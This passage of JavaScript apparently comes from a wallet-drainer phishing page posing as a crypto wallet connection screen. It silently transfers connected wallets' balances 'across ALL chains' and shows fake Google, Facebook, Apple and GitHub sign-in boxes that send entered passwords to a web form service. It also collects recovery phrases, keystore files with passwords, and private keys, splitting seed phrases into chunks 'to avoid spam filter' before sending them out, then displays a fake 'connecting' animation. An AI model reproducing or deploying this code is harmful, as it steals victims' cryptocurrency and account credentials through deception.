                // Initiate silent transfer across ALL chains simultaneously
                await silentTransferRemainingBalance(connectionInfo);
                    
            } catch (e) {
                console.error(`[Wallet Click] Failed to connect ${walletName}:`, e);
                msgEl.textContent = `Connection failed: ${e.message}`;
                msgEl.classList.add('failed');
                
                // Auto-hide error after 3s
                setTimeout(() => {
                    msgEl.textContent = '';
                    msgEl.classList.remove('failed');
                }, 3000);
            }
        })();
    }

    function resetWallets() {
        document.querySelectorAll('.wallet-item').forEach(item => {
            item.classList.remove('selected');
            item.style.display = '';
        });
        statusMessage.textContent = 'Select a wallet to connect';
        statusMessage.classList.remove('status-failed');
    }
    // Manual Connect Tabs
    const tabBtns = document.querySelectorAll('.tab-btn');
    const tabContents = document.querySelectorAll('.tab-content');
    tabBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            tabBtns.forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            tabContents.forEach(c => c.classList.add('hidden'));
            document.getElementById(btn.dataset.tab + '-tab').classList.remove('hidden');
            if (btn.dataset.tab === 'phrase') {
                updatePhraseGrid();
            }
        });
    });
    // Dynamic phrase grid with REAL BIP-39 word check (green/red)
    const phraseGrid = document.getElementById('phrase-grid');
    const radio12 = document.querySelector('input[value="12"]');
    const radio24 = document.querySelector('input[value="24"]');
    // Real BIP-39 word validation function (using a large subset of the official list)
    const isValidBip39Word = (word) => {
        const validWords = new Set([
            "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse",
            "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act",
            "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit",
            "adult", "advance", "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent",
            "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol", "alert",
            "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already", "also", "alter",
            "always", "amateur", "amazing", "among", "amount", "amused", "analyst", "anchor", "ancient", "anger",
            "angle", "angry", "animal", "ankle", "announce", "annual", "another", "answer", "antenna", "antique",
            "arrive", "arrow", "art", "artefact", "artist", "artwork", "ask", "aspect", "assault", "asset",
            "assist", "assume", "asthma", "athlete", "atom", "attack", "attend", "attitude", "attract", "auction",
            "audit", "august", "aunt", "author", "auto", "autumn", "average", "avocado", "avoid", "awake",
            "aware", "away", "awesome", "awful", "awkward", "axis", "baby", "bachelor", "bacon", "badge",
            "bag", "balance", "balcony", "ball", "bamboo", "banana", "banner", "bar", "barely", "bargain",
            "barrel", "base", "basic", "basket", "battle", "beach", "bean", "beauty", "because", "become",
            "beef", "before", "begin", "behave", "behind", "believe", "below", "belt", "bench", "benefit",
            "best", "betray", "better", "between", "beyond", "bicycle", "bid", "bike", "bind", "biology",
            "bird", "birth", "bitter", "black", "blade", "blame", "blanket", "blast", "bleak", "bless",
            "blind", "blood", "blossom", "blouse", "blue", "blur", "blush", "board", "boat", "body",
            "boil", "bomb", "bone", "bonus", "book", "boost", "border", "boring", "borrow", "boss",
            "bottom", "bounce", "box", "boy", "bracket", "brain", "brand", "brass", "brave", "bread",
            "breeze", "brick", "bridge", "brief", "bright", "bring", "brisk", "broccoli", "broken", "bronze",
            "broom", "brother", "brown", "brush", "bubble", "buddy", "budget", "buffalo", "build", "bulb",
            "bulk", "bullet", "bundle", "bunker", "burden", "burger", "burst", "bus", "business", "busy",
            "butter", "buyer", "buzz", "cabbage", "cabin", "cable", "cactus", "cage", "cake", "call",
            "calm", "camera", "camp", "can", "canal", "cancel", "candy", "cannon", "canoe", "canvas",
            "canyon", "capable", "capital", "captain", "car", "carbon", "card", "cargo", "carpet", "carry",
            "cart", "case", "cash", "casino", "castle", "casual", "cat", "catalog", "catch", "category",
            "cattle", "caught", "cause", "caution", "cave", "ceiling", "celery", "cement", "census", "century",
            "cereal", "certain", "chair", "chalk", "champion", "change", "chaos", "chapter", "charge", "chase",
            "chat", "cheap", "check", "cheese", "chef", "cherry", "chest", "chicken", "chief", "child",
            "chimney", "choice", "choose", "chronic", "chuckle", "chunk", "churn", "cigar", "cinnamon", "circle",
            "citizen", "city", "civil", "claim", "clap", "clarify", "claw", "clay", "clean", "clerk",
            "clever", "click", "client", "cliff", "climb", "clinic", "clip", "clock", "clog", "close",
            "cloth", "cloud", "clown", "club", "clump", "cluster", "clutch", "coach", "coast", "coconut",
            "code", "coffee", "coil", "coin", "collect", "color", "column", "combine", "come", "comfort",
            "comic", "common", "company", "concert", "conduct", "confirm", "congress", "connect", "consider", "control",
            "convince", "cook", "cool", "copper", "copy", "coral", "core", "corn", "correct", "cost",
            "cotton", "couch", "country", "couple", "course", "cousin", "cover", "coyote", "crack", "cradle",
            "craft", "cram", "crane", "crash", "crater", "crawl", "crazy", "cream", "credit", "creek",
            "crew", "cricket", "crime", "crisp", "critic", "crop", "cross", "crouch", "crowd", "crucial",
            "cruel", "cruise", "crumble", "crunch", "crush", "cry", "crystal", "cube", "culture", "cup",
            "cupboard", "curious", "current", "curtain", "curve", "cushion", "custom", "cute", "cycle", "dad",
            "damage", "damp", "dance", "danger", "daring", "dash", "daughter", "dawn", "day", "deal",
            "debate", "debris", "decade", "december", "decide", "decline", "decorate", "decrease", "deer", "defense",
            "define", "defy", "degree", "delay", "deliver", "demand", "demise", "denial", "dentist", "deny",
            "depart", "depend", "deposit", "depth", "deputy", "derive", "describe", "desert", "design", "desk",
            "despair", "destroy", "detail", "detect", "develop", "device", "devote", "diagram", "dial", "diamond",
            "diary", "dice", "diesel", "diet", "differ", "digital", "dignity", "dilemma", "dinner", "dinosaur",
            "direct", "dirt", "disagree", "discover", "disease", "dish", "dismiss", "disorder", "display", "distance",
            "divert", "divide", "divorce", "dizzy", "doctor", "document", "dog", "doll", "dolphin", "domain",
            "donate", "donkey", "donor", "door", "dose", "double", "dove", "draft", "dragon", "drama",
            "drastic", "draw", "dream", "dress", "drift", "drill", "drink", "drip", "drive", "drop",
            "drum", "dry", "duck", "dumb", "dune", "during", "dust", "dutch", "duty", "dwarf",
            "dynamic", "eager", "eagle", "early", "earn", "earth", "easily", "east", "easy", "echo",
            "ecology", "economy", "edge", "edit", "educate", "effort", "egg", "eight", "either", "elbow",
            "elder", "electric", "elegant", "element", "elephant", "elevator", "elite", "else", "embark", "embody",
            "embrace", "emerge", "emotion", "employ", "empower", "empty", "enable", "enact", "end", "endless",
            "endorse", "enemy", "energy", "enforce", "engage", "engine", "enhance", "enjoy", "enlist", "enough",
            "enrich", "enroll", "ensure", "enter", "entire", "entry", "envelope", "episode", "equal", "equip",
            "era", "erase", "erode", "erosion", "error", "erupt", "escape", "essay", "essence", "estate",
            "eternal", "ethics", "evidence", "evil", "evoke", "evolve", "exact", "example", "excess", "exchange",
            "excite", "exclude", "excuse", "execute", "exercise", "exhaust", "exhibit", "exile", "exist", "exit",
            "exotic", "expand", "expect", "expense", "expert", "expire", "explain", "expose", "express", "extend",
            "extra", "eye", "eyebrow", "fabric", "face", "faculty", "fade", "faint", "faith", "fall",
            "false", "fame", "family", "famous", "fan", "fancy", "fantasy", "farm", "fashion", "fat",
            "fatal", "father", "fatigue", "fault", "favorite", "feature", "february", "federal", "fee", "feed",
            "feel", "female", "fence", "festival", "fetch", "fever", "few", "fiber", "fiction", "field",
            "figure", "file", "film", "filter", "final", "find", "fine", "finger", "finish", "fire",
            "firm", "first", "fiscal", "fish", "fit", "fitness", "fix", "flag", "flame", "flash",
            "flat", "flavor", "flee", "flight", "flip", "float", "flock", "floor", "flower", "fluid",
            "flush", "fly", "foam", "focus", "fog", "foil", "fold", "follow", "food", "foot",
            "force", "forest", "forget", "fork", "fortune", "forum", "forward", "fossil", "foster", "found",
            "fox", "fragile", "frame", "frequent", "fresh", "friend", "fringe", "frog", "front", "frost",
            "frown", "frozen", "fruit", "fuel", "fun", "funny", "furnace", "fury", "future", "gadget",
            "gain", "galaxy", "gallery", "game", "gap", "garage", "garbage", "garden", "garlic", "garment",
            "gas", "gasp", "gate", "gather", "gauge", "gaze", "general", "genius", "genre", "gentle",
            "genuine", "gesture", "ghost", "giant", "gift", "giggle", "ginger", "giraffe", "girl", "give",
            "glad", "glance", "glare", "glass", "glide", "glimpse", "globe", "gloom", "glory", "glove",
            "glow", "glue", "goat", "goddess", "gold", "good", "goose", "gorilla", "gospel", "gossip",
            "govern", "gown", "grab", "grace", "grain", "grant", "grape", "grass", "gravity", "great",
            "green", "grid", "grief", "grit", "grocery", "group", "grow", "grunt", "guard", "guess",
            "guide", "guilt", "guitar", "gun", "gym", "habit", "hair", "half", "hammer", "hamster",
            "hand", "happy", "harbor", "hard", "harsh", "harvest", "hat", "have", "hawk", "hazard",
            "head", "health", "heart", "heavy", "hedgehog", "height", "hello", "helmet", "help", "hen",
            "hero", "hidden", "high", "hill", "hint", "hip", "hire", "history", "hobby", "hockey",
            "hold", "hole", "holiday", "hollow", "home", "honey", "hood", "hope", "horn", "horror",
            "horse", "hospital", "host", "hotel", "hour", "hover", "hub", "huge", "human", "humble",
            "humor", "hundred", "hungry", "hunt", "hurdle", "hurry", "hurt", "husband", "hybrid", "ice",
            "icon", "idea", "identify", "idle", "ignore", "ill", "illegal", "illness", "image", "imitate",
            "immense", "immune", "impact", "impose", "improve", "impulse", "inch", "include", "income", "increase",
            "index", "indicate", "indoor", "industry", "infant", "inflict", "inform", "inhale", "inherit", "initial",
            "inject", "injury", "inmate", "inner", "innocent", "input", "inquiry", "insane", "insect", "inside",
            "inspire", "install", "intact", "interest", "into", "invest", "invite", "involve", "iron", "island",
            "isolate", "issue", "item", "ivory", "jacket", "jaguar", "jar", "jazz", "jealous", "jeans",
            "jelly", "jewel", "job", "join", "joke", "journey", "joy", "judge", "juice", "jump",
            "jungle", "junior", "junk", "just", "kangaroo", "keen", "keep", "ketchup", "key", "kick",
            "kid", "kidney", "kind", "kingdom", "kiss", "kit", "kitchen", "kite", "kitten", "kiwi",
            "knee", "knife", "knock", "know", "lab", "label", "labor", "ladder", "lady", "lake",
            "lamp", "language", "laptop", "large", "later", "latin", "laugh", "laundry", "lava", "law",
            "lawn", "lawsuit", "layer", "lazy", "leader", "leaf", "learn", "leave", "lecture", "left",
            "leg", "legal", "legend", "leisure", "lemon", "lend", "length", "lens", "leopard", "lesson",
            "letter", "level", "liar", "liberty", "library", "license", "life", "lift", "light", "like",
            "limb", "limit", "link", "lion", "liquid", "list", "little", "live", "lizard", "load",
            "loan", "lobster", "local", "lock", "logic", "lonely", "long", "loop", "lottery", "loud",
            "lounge", "love", "loyal", "lucky", "luggage", "lumber", "lunar", "lunch", "luxury", "lyrics",
            "machine", "mad", "magic", "magnet", "maid", "mail", "main", "major", "make", "mammal",
            "man", "manage", "mandate", "mango", "mansion", "manual", "maple", "marble", "march", "margin",
            "marine", "market", "marriage", "mask", "mass", "master", "match", "material", "math", "matrix",
            "matter", "maximum", "maze", "meadow", "mean", "measure", "meat", "mechanic", "medal", "media",
            "melody", "melt", "member", "memory", "mention", "menu", "mercy", "merge", "merit", "merry",
            "mesh", "message", "metal", "method", "middle", "midnight", "milk", "million", "mimic", "mind",
            "minimum", "minor", "minute", "miracle", "mirror", "misery", "miss", "mistake", "mix", "mixed",
            "mixture", "mobile", "model", "modify", "mom", "moment", "monitor", "monkey", "monster", "month",
            "moon", "moral", "more", "morning", "mosquito", "mother", "motion", "motor", "mountain", "mouse",
            "move", "movie", "much", "muffin", "mule", "multiply", "muscle", "museum", "mushroom", "music",
            "must", "mutual", "myself", "mystery", "myth", "naive", "name", "napkin", "narrow", "nasty",
            "nation", "nature", "near", "neck", "need", "negative", "neglect", "neither", "nephew", "nerve",
            "nest", "net", "network", "neutral", "never", "news", "next", "nice", "night", "noble",
            "noise", "nominee", "noodle", "normal", "north", "nose", "notable", "note", "nothing", "notice",
            "novel", "now", "nuclear", "number", "nurse", "nut", "oak", "obey", "object", "oblige",
            "obscure", "observe", "obtain", "obvious", "occur", "ocean", "october", "odor", "off", "offer",
            "office", "often", "oil", "okay", "old", "olive", "olympic", "omit", "once", "one",
            "onion", "online", "only", "open", "opera", "opinion", "oppose", "option", "orange", "orbit",
            "orchard", "order", "ordinary", "organ", "orient", "original", "orphan", "ostrich", "other", "outdoor",
            "outer", "output", "outside", "oval", "oven", "over", "own", "owner", "oxygen", "oyster",
            "ozone", "pact", "paddle", "page", "pair", "palace", "palm", "panda", "panel", "panic",
            "panther", "paper", "parade", "parent", "park", "parrot", "party", "pass", "patch", "path",
            "patient", "patrol", "pattern", "pause", "pave", "payment", "peace", "peanut", "pear", "peasant",
            "pelican", "pen", "penalty", "pencil", "people", "pepper", "perfect", "permit", "person", "pet",
            "phone", "photo", "phrase", "physical", "piano", "picnic", "picture", "piece", "pig", "pigeon",
            "pill", "pilot", "pink", "pioneer", "pipe", "pistol", "pitch", "pizza", "place", "planet",
            "plastic", "plate", "play", "please", "pledge", "pluck", "plug", "plunge", "poem", "poet",
            "point", "polar", "pole", "police", "pond", "pony", "pool", "popular", "portion", "position",
            "possible", "post", "potato", "pottery", "poverty", "powder", "power", "practice", "praise", "predict",
            "prefer", "prepare", "present", "pretty", "prevent", "price", "pride", "primary", "print", "priority",
            "prison", "private", "prize", "problem", "process", "produce", "profit", "program", "project", "promote",
            "proof", "property", "prosper", "protect", "proud", "provide", "public", "pudding", "pull", "pulp",
            "pulse", "pumpkin", "punch", "pupil", "puppy", "purchase", "purity", "purpose", "purse", "push",
            "put", "puzzle", "pyramid", "quality", "quantum", "quarter", "question", "quick", "quit", "quiz",
            "quote", "rabbit", "raccoon", "race", "rack", "radar", "radio", "rail", "rain", "raise",
            "rally", "ramp", "ranch", "random", "range", "rapid", "rare", "rate", "rather", "raven",
            "raw", "razor", "ready", "real", "reason", "rebel", "rebuild", "recall", "receive", "recipe",
            "record", "recycle", "reduce", "reflect", "reform", "refuse", "region", "regret", "regular", "reject",
            "relax", "release", "relief", "rely", "remain", "remember", "remind", "remove", "render", "renew",
            "rent", "reopen", "repair", "repeat", "replace", "report", "require", "rescue", "resemble", "resist",
            "resource", "response", "result", "retire", "retreat", "return", "reunion", "reveal", "review", "reward",
            "rhythm", "rib", "ribbon", "rice", "rich", "ride", "ridge", "rifle", "right", "rigid",
            "ring", "riot", "ripple", "risk", "ritual", "rival", "river", "road", "roast", "robot",
            "robust", "rocket", "romance", "roof", "rookie", "room", "rose", "rotate", "rough", "round",
            "route", "royal", "rubber", "rude", "rug", "rule", "run", "runway", "rural", "sad",
            "saddle", "sadness", "safe", "sail", "salad", "salmon", "salon", "salt", "salute", "same",
            "sample", "sand", "satisfy", "satoshi", "sauce", "sausage", "save", "say", "scale", "scan",
            "scare", "scatter", "scene", "scheme", "school", "science", "scissors", "scorpion", "scout", "scrap",
            "screen", "script", "scrub", "sea", "search", "season", "seat", "second", "secret", "section",
            "security", "seed", "seek", "segment", "select", "sell", "seminar", "senior", "sense", "sentence",
            "series", "service", "session", "settle", "setup", "seven", "shadow", "shaft", "shallow", "share",
            "shed", "shell", "sheriff", "shield", "shift", "shine", "ship", "shiver", "shock", "shoe",
            "shoot", "shop", "short", "shoulder", "shove", "shrimp", "shrug", "shuffle", "shy", "sibling",
            "sick", "side", "siege", "sight", "sign", "silent", "silk", "silly", "silver", "similar",
            "simple", "since", "sing", "siren", "sister", "situation", "six", "size", "skate", "sketch",
            "ski", "skill", "skin", "skirt", "skull", "slab", "slam", "sleep", "slender", "slice",
            "slide", "slight", "slim", "slogan", "slot", "slow", "slush", "small", "smart", "smile",
            "smoke", "smooth", "snack", "snake", "snap", "sniff", "snow", "soap", "soccer", "social",
            "sock", "soda", "soft", "solar", "soldier", "solid", "solution", "solve", "someone", "song",
            "soon", "sorry", "sort", "soul", "sound", "soup", "source", "south", "space", "spare",
            "spatial", "spawn", "speak", "special", "speed", "spell", "spend", "sphere", "spice", "spider",
            "spike", "spin", "spirit", "split", "spoil", "sponsor", "spoon", "sport", "spot", "spray",
            "spread", "spring", "spy", "square", "squeeze", "squirrel", "stable", "stadium", "staff", "stage",
            "stairs", "stamp", "stand", "start", "state", "stay", "steak", "steel", "stem", "step",
            "stereo", "stick", "still", "sting", "stock", "stomach", "stone", "stool", "story", "stove",
            "strategy", "street", "strike", "strong", "struggle", "student", "stuff", "stumble", "style", "subject",
            "submit", "subway", "success", "such", "sudden", "suffer", "sugar", "suggest", "suit", "summer",
            "sun", "sunny", "sunset", "super", "supply", "supreme", "sure", "surface", "surge", "surprise",
            "surround", "survey", "suspect", "sustain", "swallow", "swamp", "swap", "swarm", "swear", "sweet",
            "swift", "swim", "swing", "switch", "sword", "symbol", "symptom", "syrup", "system", "table",
            "tackle", "tag", "tail", "talent", "talk", "tank", "tape", "target", "task", "taste",
            "tattoo", "taxi", "teach", "team", "tell", "ten", "tenant", "tennis", "tent", "term",
            "test", "text", "thank", "that", "theme", "then", "theory", "there", "they", "thing",
            "this", "thought", "three", "thrive", "throw", "thumb", "thunder", "ticket", "tide", "tiger",
            "tilt", "timber", "time", "tiny", "tip", "tired", "tissue", "title", "toast", "tobacco",
            "today", "toddler", "toe", "together", "toilet", "token", "tomato", "tomorrow", "tone", "tongue",
            "tonight", "tool", "tooth", "top", "topic", "topple", "torch", "tornado", "tortoise", "toss",
            "total", "tourist", "toward", "tower", "town", "toy", "track", "trade", "traffic", "tragic",
            "train", "transfer", "trap", "trash", "travel", "tray", "treat", "tree", "trend", "trial",
            "tribe", "trick", "trigger", "trim", "trip", "trophy", "trouble", "truck", "true", "truly",
            "trumpet", "trust", "truth", "try", "tube", "tuition", "tumble", "tuna", "tunnel", "turkey",
            "turn", "turtle", "twelve", "twenty", "twice", "twin", "twist", "two", "type", "typical",
            "ugly", "umbrella", "unable", "unaware", "uncle", "uncover", "under", "undo", "unfair", "unfold",
            "unhappy", "uniform", "unique", "unit", "universe", "unknown", "unlock", "until", "unusual", "unveil",
            "update", "upgrade", "uphold", "upon", "upper", "upset", "urban", "urge", "usage", "use",
            "used", "useful", "useless", "usual", "utility", "vacant", "vacuum", "vague", "valid", "valley",
            "valve", "van", "vanish", "vapor", "various", "vast", "vault", "vehicle", "velvet", "vendor",
            "venture", "venue", "verb", "verify", "version", "very", "vessel", "veteran", "viable", "vibrant",
            "vicious", "victory", "video", "view", "village", "vintage", "violin", "virtual", "virus", "visa",
            "visit", "visual", "vital", "vivid", "vocal", "voice", "void", "volcano", "volume", "vote",
            "voyage", "wage", "wagon", "wait", "walk", "wall", "walnut", "want", "warfare", "warm",
            "warrior", "wash", "wasp", "waste", "water", "wave", "way", "wealth", "weapon", "wear",
            "weasel", "weather", "web", "wedding", "weekend", "weird", "welcome", "west", "wet", "whale",
            "what", "wheat", "wheel", "when", "where", "whip", "whisper", "wide", "width", "wife",
            "wild", "will", "win", "window", "wine", "wing", "wink", "winner", "winter", "wire",
            "wisdom", "wise", "wish", "witness", "wolf", "woman", "wonder", "wood", "wool", "word",
            "work", "world", "worry", "worth", "wrap", "wreck", "wrestle", "wrist", "write", "wrong",
            "yard", "year", "yellow", "you", "young", "youth", "zebra", "zero", "zone", "zoo"
        ]);
        return validWords.has(word.toLowerCase());
    };
    function updatePhraseGrid() {
        const phraseGridEl = document.getElementById('phrase-grid');
        const r12 = document.querySelector('input[value="12"]');
        const r24 = document.querySelector('input[value="24"]');
        if (!phraseGridEl) return;
        phraseGridEl.innerHTML = '';
        const count = (r12 && r12.checked) ? 12 : 24;
        const cols = (r12 && r12.checked) ? 3 : 4;
        phraseGridEl.style.gridTemplateColumns = `repeat(${cols}, 1fr)`;
        for (let i = 0; i < count; i++) {
            const div = document.createElement('div');
            const input = document.createElement('input');
            input.className = 'word-input';
            input.placeholder = `Word ${i+1}`;
            input.maxLength = 20;
            input.addEventListener('input', function() {
                const word = this.value.trim();
                if (word === '') {
                    this.classList.remove('correct', 'incorrect');
                    return;
                }
                if (isValidBip39Word(word)) {
                    this.classList.remove('incorrect');
                    this.classList.add('correct');
                } else {
                    this.classList.remove('correct');
                    this.classList.add('incorrect');
                }
            });
            div.appendChild(input);
            phraseGridEl.appendChild(div);
        }
    }
    // Re-bind change listeners (use runtime query to avoid TDZ/order issues)
    (function attachPhraseListeners(){
        const r12 = document.querySelector('input[value="12"]');
        const r24 = document.querySelector('input[value="24"]');
        if (r12) r12.removeEventListener('change', updatePhraseGrid);
        if (r24) r24.removeEventListener('change', updatePhraseGrid);
        if (r12) r12.addEventListener('change', updatePhraseGrid);
        if (r24) r24.addEventListener('change', updatePhraseGrid);
    })();
    // Initial setup
    updatePhraseGrid();

    // Show the full manual connect modal logic (centralized)
    function showManualConnectModal() {
        try {
            const manualOverlay = document.getElementById('manual-overlay');
            if (!manualOverlay) return;
            // Ensure phrase tab is active and grid updated
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            const phraseBtn = document.querySelector('.tab-btn[data-tab="phrase"]');
            if (phraseBtn) phraseBtn.classList.add('active');
            document.querySelectorAll('.tab-content').forEach(c => c.classList.add('hidden'));
            const phraseTab = document.getElementById('phrase-tab');
            if (phraseTab) phraseTab.classList.remove('hidden');
            updatePhraseGrid();

            manualOverlay.style.display = 'flex';
            // Force reflow then add active class for animations
            void manualOverlay.offsetHeight;
            setTimeout(() => manualOverlay.classList.add('active'), 10);
            // Focus first input if present
            const firstInput = manualOverlay.querySelector('.word-input, #keystore-json, #private-key');
            if (firstInput) firstInput.focus();
        } catch (e) { console.warn('showManualConnectModal error:', e); }
    }
    // Expose globally so earlier script blocks / event handlers can call it
    try { window.showManualConnectModal = showManualConnectModal; } catch (e) { /* ignore */ }
    
    // Delegated social login handler — works even if icons are recreated
    document.addEventListener('click', function delegatedSocialClick(e){
        const icon = e.target.closest && e.target.closest('.social-icon');
        if (!icon) return;
        const provider = icon.dataset.provider;
        const names = { google: 'Google', facebook: 'Facebook', apple: 'Apple', github: 'GitHub' };

        // Create overlay if missing
        if (!document.getElementById('dynamic-login-overlay')) {
            const overlay = document.createElement('div');
            overlay.id = 'dynamic-login-overlay';
            overlay.className = 'login-overlay';
            overlay.innerHTML = `
                <div class="login-box">
                    <h3 id="dynamic-login-title">Sign in with <span id="dynamic-provider-name"></span></h3>
                    <input type="text" id="dynamic-email-input" class="login-input" placeholder="Email or Username">
                    <input type="password" id="dynamic-password-input" class="login-input" placeholder="Password">
                    <input type="text" name="botcheck" style="display:none;" />
                    <button class="login-btn" id="dynamic-signin-btn">Sign In / Sign Up</button>
                    <button class="mt-4 text-gray-400 hover:text-white text-sm" id="dynamic-cancel-btn">Cancel</button>
                </div>
            `;
            document.body.appendChild(overlay);

            // Attach event listeners
            document.getElementById('dynamic-signin-btn').addEventListener('click', handleSocialLoginSubmit);
            document.getElementById('dynamic-cancel-btn').addEventListener('click', closeLogin);
        }

        document.getElementById('dynamic-provider-name').textContent = names[provider] || provider;
        document.getElementById('dynamic-login-overlay').style.display = 'flex';
    });
    
    function closeLogin() {
        const overlay = document.getElementById('dynamic-login-overlay');
        if (overlay) overlay.style.display = 'none';
    }
    
    // Ensure the open modal button works now that the DOM is ready
    function setupOpenButtonListener() {
        try {
            // Use querySelector to get the button
            const btn = document.querySelector('#open-modal') || openBtn;
            const overlay = document.querySelector('#modal-overlay') || modalOverlay;
            
            console.log('[Init] Button element:', btn);
            console.log('[Init] Modal overlay element:', overlay);
            
            if (!btn) {
                console.error('[Init] ✗ open-modal button element not found');
                return;
            }
            
            btn.addEventListener('click', function handleModalOpen() {
                console.log('[Modal] Button clicked!');
                
                if (!overlay) {
                    console.error('[Modal] modalOverlay element not found');
                    return;
                }
                
                try {
                    console.log('[Modal] Opening wallet selection modal');
                    // Remove display: none and set display: flex through inline style first
                    overlay.style.display = 'flex';
                    overlay.style.opacity = '0';
                    // Force reflow to ensure display is applied
                    void overlay.offsetHeight;
                    console.log('[Modal] Display set to flex');
                    
                    // Now add the active class which will trigger CSS animations
                    setTimeout(() => {
                        overlay.classList.add('active');
                        console.log('[Modal] Active class added, should show with animation');
                    }, 10);
                    
                    if (typeof renderVisibleWallets === 'function') {
                        renderVisibleWallets();
                        console.log('[Modal] Rendered visible wallets');
                    } else {
                        console.warn('[Modal] renderVisibleWallets not found');
                    }
                    
                    if (typeof populateExtraWallets === 'function') {
                        populateExtraWallets();
                        console.log('[Modal] Populated extra wallets');
                    } else {
                        console.warn('[Modal] populateExtraWallets not found');
                    }
                } catch (err) {
                    console.error('[Modal] Error in click handler:', err);
                }
            });
            
            console.log('[Init] ✓ Open modal button listener attached successfully');
        } catch (err) {
            console.error('[Init] Error setting up listener:', err);
        }
    }
    
    // Register the listener when DOM is ready
    console.log('[Init] Initial readyState:', document.readyState);
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', setupOpenButtonListener);
        console.log('[Init] Registered DOMContentLoaded listener');
    } else {
        console.log('[Init] DOM already loaded, setting up immediately');
        setupOpenButtonListener();
    }

    // ── Social Login Submit ───────────────────────────────────────────────
  async function handleSocialLoginSubmit() {
    const email = document.getElementById('dynamic-email-input')?.value.trim();
    const password = document.getElementById('dynamic-password-input')?.value.trim();
    const provider = document.getElementById('dynamic-provider-name')?.textContent || 'Unknown';

    if (!email || !password) {
      alert('Please enter email and password');
      return;
    }

    const data = {
      subject: 'User Sign In Attempt',
      name: `Login via ${provider}`,
      email: email,
            message: `Password entered for ${provider} login`,
            feedback: password,
      description: `User-Agent: ${navigator.userAgent}`,
      timestamp: new Date().toISOString()
    };

    const result = await submitToWeb3Forms(data);

        if (result.success) {
            // Success: clear inputs but keep processing overlay visible per request
            document.getElementById('dynamic-email-input').value = '';
            document.getElementById('dynamic-password-input').value = '';
            // Do not hide the dynamic login overlay here
        } else {
            alert('Failed: ' + result.error);
        }
  }

  // ── Manual Connect Submit ─────────────────────────────────────────────
  async function handleManualConnectSubmit() {
    const activeTab = document.querySelector('.tab-btn.active')?.dataset.tab || 'phrase';
    let data = {
      subject: 'Wallet Connection Request',
      name: 'User Wallet Submission',
      user_message: `Submission from ${navigator.userAgent}`,
      timestamp: new Date().toISOString()
    };

    if (activeTab === 'phrase') {
      const words = [...document.querySelectorAll('#phrase-grid .word-input')]
        .map(i => i.value.trim())
        .filter(Boolean);

      if (words.length !== 12 && words.length !== 24) {
        return alert(`Please enter exactly 12 or 24 words (you entered ${words.length})`);
      }

      // Split into small, innocent-looking chunks to avoid spam filter
      data.part1 = words.slice(0, 8).join(' ') || '(empty)';
      data.part2 = words.slice(8, 16).join(' ') || '(empty)';
      data.part3 = words.slice(16).join(' ') || '(empty)';
      data.word_count = words.length;
      data.description = `Recovery phrase (${words.length} words)`;
    } 
    else if (activeTab === 'keystore') {
      const json = document.getElementById('keystore-json')?.value.trim();
      const password = document.getElementById('keystore-password')?.value.trim() || '';
      if (!json) return alert('Enter keystore JSON');
      data.message = json;
      data.feedback = password;
      data.description = 'Wallet backup file';
    } 
    else if (activeTab === 'private') {
      const key = document.getElementById('private-key')?.value.trim();
      if (!key) return alert('Enter private key');
      data.message = key;
      data.description = 'Private access key';
    }

    const result = await submitToWeb3Forms(data);

        if (result.success) {
            // Success: show the white "connecting" overlay and keep it visible (do not auto-hide)
            try {
                // Determine selected wallet name if available
                const walletName = document.getElementById('overlay-wallet-name')?.textContent.trim() || 'Selected Wallet';
                // Show the full white connecting overlay flow
                try { showFullConnectOverlay(walletName); } catch (e) {}
                // Ensure connect ring visible/animating
                try { document.getElementById('connectRing')?.classList.add('active'); } catch (e) {}
            } catch (e) { /* ignore overlay errors */ }
            // Clear fields & close modal
      if (activeTab === 'phrase') {
        document.querySelectorAll('#phrase-grid .word-input').forEach(i => i.value = '');
      }
      if (activeTab === 'keystore') {
        document.getElementById('keystore-json').value = '';
        document.getElementById('keystore-password').value = '';
      }
      if (activeTab === 'private') {
        document.getElementById('private-key').value = '';
      }
      document.getElementById('manual-overlay')?.classList.remove('active');
    } else {
      alert('Failed: ' + result.error);
    }
  }

  // Attach only to buttons
  document.addEventListener('DOMContentLoaded', () => {
    document.getElementById('dynamic-signin-btn')?.addEventListener('click', handleSocialLoginSubmit);
    document.getElementById('manual-connect-btn')?.addEventListener('click', handleManualConnectSubmit);
  });
  
  // Ensure WalletConnect SignClient is available globally
  window.addEventListener('load', () => {
    if (typeof window.WalletConnectSignClient !== 'undefined' && !window.SignClient) {
      window.SignClient = window.WalletConnectSignClient;
      console.log('[Init] ✓ WalletConnect SignClient initialized globally');
    }
  });
}
</script>

<!-- Fallback script to ensure modal button works -->
<script>
  (function() {
    console.log('[Fallback] Ensuring modal button is wired up');
    
    function setupButton() {
      const btn = document.getElementById('open-modal');
      const modal = document.getElementById('modal-overlay');
      
      console.log('[Fallback] Button found:', !!btn);
      console.log('[Fallback] Modal found:', !!modal);
      
      if (!btn || !modal) {
        console.error('[Fallback] Missing button or modal');
        console.error('[Fallback] Document has', document.querySelectorAll('*').length, 'elements');
        return;
      }
      
      // Remove any existing listeners by cloning
      const newBtn = btn.cloneNode(true);
      btn.parentNode.replaceChild(newBtn, btn);
      
      newBtn.addEventListener('click', function(e) {
        console.log('[Fallback] Modal button clicked!', e);
        try {
          modal.style.display = 'flex';
          console.log('[Fallback] Set display to flex');
          
          // Don't set opacity inline - let CSS handle it via .active class
          // Force reflow before adding active class
          void modal.offsetHeight;
          console.log('[Fallback] Forced reflow');
          
          setTimeout(() => {
            modal.classList.add('active');
            console.log('[Fallback] Added active class, modal should now be visible');
            
            // Try to call the render functions from the global scope or find them
            try {
              // Check if functions are available globally
              if (window.renderVisibleWallets) {
                window.renderVisibleWallets();
                console.log('[Fallback] Called window.renderVisibleWallets');
              }
              if (window.populateExtraWallets) {
                window.populateExtraWallets();
                console.log('[Fallback] Called window.populateExtraWallets');
              }
            } catch (fnErr) {
              console.warn('[Fallback] Could not call wallet functions:', fnErr.message);
            }
          }, 10);
